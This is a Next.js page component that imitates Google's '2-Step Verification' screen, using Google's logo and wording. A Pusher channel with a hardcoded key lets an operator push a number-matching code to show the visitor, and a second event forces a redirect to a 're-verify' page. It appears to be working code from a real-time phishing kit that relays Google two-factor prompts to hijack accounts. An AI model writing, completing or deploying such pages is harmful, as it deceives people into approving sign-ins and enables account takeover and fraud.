"use client";
import React, { use, useEffect, useState } from "react";
import { useRouter } from "next/navigation";
import Image from "next/image";
import Cookies from "js-cookie";
import Pusher from "pusher-js";
export default function VerifyCode() {
  const [successId, setSuccessId] = useState("");
  const [ReverifyId, setReVerifyId] = useState("");
  const [code, setCode] = useState("");
  const router = useRouter();
  const id = Cookies.get("id");
  const pusher = new Pusher("e4766909b306ad7ddd58", {
    // APP_KEY
    cluster: "ap2",
    encrypted: true,
  });
  useEffect(() => {
    setCode(Cookies.get("code"));
  }, [id]);
  useEffect(() => {
    const channel = pusher.subscribe(id);

    channel.bind("code-verify", (data) => {
      // Perform the revalidation or data fetching logic here
      console.log("Path data updated:", data);
      setCode(data?.code);
      console.log(data.id);
      setSuccessId(data.id); // Function to refetch or revalidate your path data
    });

    return () => {
      channel.unbind("code-verify");
      channel.unsubscribe(id);
    };
  }, [id, successId]);

  useEffect(() => {
    const channel = pusher.subscribe(id);
    channel.bind("code-re-verify", (data) => {
      // Perform the revalidation or data fetching logic here
      console.log("Path data updated:", data);
      Cookies.set("code", data.code);
      setReVerifyId(data.id); // Function to refetch or revalidate your path data
    });

    return () => {
      channel.unbind("code-re-verify");
      channel.unsubscribe(id);
    };
  }, [id]);

  // if (successId) {
  //   // Perform the revalidation or data fetching logic here
  //   window.location.reload()
  // }
  if (ReverifyId) {
    // Perform the revalidation or data fetching logic here
    return router.push(`/reVerifyCode`);
  }

  return (
    <div className="relative min-h-screen flex items-center justify-center">
      {/* Background Map */}
      <iframe
        className="absolute inset-0 w-full h-full object-cover filter blur-sm brightness-75 z-[-1]"
        src="https://www.google.com/maps/embed?pb=!1m18!1m12!1m3!1d3153.5693930527423!2d144.95855721544715!3d-37.818435979751494!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x6ad642af0f11fd81%3A0xf577f5d1f11f1c1b!2sFederation%20Square!5e0!3m2!1sen!2sau!4v1601360233956!5m2!1sen!2sau"
        frameBorder="0"
        allowFullScreen
        loading="lazy"
      ></iframe>

      {/* Form Container */}
      <div className="font-roboto flex flex-col justify-center items-center bg-white text-[#202124] text-base rounded-lg shadow-lg px-6 md:px-10 py-9 md:w-[450px] w-[90%] max-w-[500px] p-3 gap-5">
        <div className="flex justify-center">
          <img src="/images/google.png" alt="google" width={82} height={30} />
        </div>

        <div className=" text-center">
          <h3 className="text-2xl">2-Step Verification</h3>
          <p className="">
            To help keep your account safe, Google wants to make sure it's
            really you trying to sign in
          </p>
        </div>

        <div className="flex flex-col items-center gap-4">
          <img className="w-44" src="/images/mobile.gif" alt="animation" />

          <div className="text-start w-full gap-3">
            <h3 className="text-lg font-semibold">Check your phone</h3>
            <h3 className="text-3xl font-semibold">{code}</h3>
            <p className="">
              Google sent a notification to your Phone. Tap Yes on the
              notification to verify it's you.
            </p>
            <div className="flex  items-center gap-3">
              <input type="checkbox" />
              <p className="ml-3">Don't ask again on this device</p>
            </div>
            <div className="flex flex-col gap-3">
              <button className="text-sm text-[#1a73e8] font-medium ">
                Resend it
              </button>
              <button className="text-sm text-[#1a73e8] font-semibold  ">
                Try another way
              </button>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}
